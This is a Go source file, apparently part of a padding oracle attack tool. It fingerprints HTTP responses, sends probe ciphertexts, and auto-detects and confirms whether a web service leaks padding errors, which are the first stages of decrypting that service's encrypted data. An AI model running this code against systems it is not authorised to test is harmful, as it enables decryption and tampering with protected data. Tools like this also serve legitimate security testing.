package main

/* various fingerprinting of HTTP responses */

import (
	"context"
	"fmt"
	"net/http"
	"regexp"
)

type fingerprint struct {
	code  int
	lines int
	words int
}

// scrape fingerprint form http response
func getResponseFingerprint(resp *http.Response, body []byte) (*fingerprint, error) {
	return &fingerprint{
		code:  resp.StatusCode,
		lines: countLines(body),
		words: countWords(body),
	}, nil
}

// check if response contains padding error
func isPaddingError(resp *http.Response, body []byte) (bool, error) {
	// try regex matcher if pattern is set
	if *config.paddingErrorPattern != "" {
		matched, err := regexp.Match(*config.paddingErrorPattern, body)
		if err != nil {
			return false, err
		}
		return matched, nil
	}

	// otherwise fallback to fingerprint
	if config.paddingErrorFingerprint != nil {
		fp, err := getResponseFingerprint(resp, body)
		if err != nil {
			return false, err
		}
		return *fp == *config.paddingErrorFingerprint, nil
	}

	return false, fmt.Errorf("Neither fingerprint nor string pattern for padding error is set")
}

// attempts to auto-detect padding oracle fingerprint
// return nil fingerprint if failed
func detectPaddingErrorFingerprint(blockLen int) (*fingerprint, error) {
	/* the context 	will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// create random cipher
	cipher := randomBlock(blockLen * 2)
	pos := blockLen - 1

	// probeFunc wrapper
	var probeFingerprint probeFunc = func(r *http.Response, b []byte) (interface{}, error) {
		return getResponseFingerprint(r, b)
	}

	// fingerprint probes
	chanResult := sendProbes(ctx, cipher, pos, probeFingerprint)

	// collect counts of fingerprints
	fpMap := map[fingerprint]int{}
	for result := range chanResult {
		if result.err != nil {
			// error during probes
			return nil, result.err
		}
		fpMap[*result.result.(*fingerprint)]++
	}

	// padding oracle must respond with 254 or 255 identical fingerprints
	for fp, count := range fpMap {
		if count == 254 || count == 255 {
			return &fp, nil
		}
	}
	return nil, nil
}

// detect bytes that do not produce padding error
// early-stop of maxCount of such bytes reached
func detectErrorlessBytes(chunk []byte, pos int, maxCount int) ([]byte, error) {
	/* the context 	will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	goodBytes := make([]byte, 0, maxCount)

	// probeFunc wrapper
	var probePaddingError probeFunc = func(r *http.Response, b []byte) (interface{}, error) {
		return isPaddingError(r, b)
	}

	/* call to probe */
	chanResult := sendProbes(ctx, chunk, pos, probePaddingError)

	/* output processing */
	for result := range chanResult {
		if result.err != nil {
			return nil, result.err
		}

		paddingError := result.result.(bool)
		if !paddingError {
			goodBytes = append(goodBytes, result.probe)
			// early exit of maxCount reached
			if len(goodBytes) >= maxCount {
				break
			}
		}
	}

	return goodBytes, nil
}

// convenient wrapper for single probes
func isPaddingErrorChunk(chunk []byte) (bool, error) {
	resp, body, err := doRequest(context.TODO(), chunk)
	if err != nil {
		return false, err
	}
	return isPaddingError(resp, body)
}

// confirms existence of padding oracle
// returns true if confirmed, false otherwise
func confirmPaddingOracle(blockLen int) (bool, error) {
	/* the context 	will be cancelled upon returning from function */
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// create random cipher
	cipher := randomBlock(blockLen * 2)
	pos := blockLen - 1

	// probeFunc wrapper
	var probePaddingError probeFunc = func(r *http.Response, b []byte) (interface{}, error) {
		return isPaddingError(r, b)
	}

	// send probes
	chanResult := sendProbes(ctx, cipher, pos, probePaddingError)

	// count padding errors
	count := 0
	for result := range chanResult {
		if result.err != nil {
			return false, result.err
		}
		if result.result.(bool) {
			count++
		}
	}

	// padding oracle must produce exactly 254 or 255 errors
	return count == 254 || count == 255, nil
}
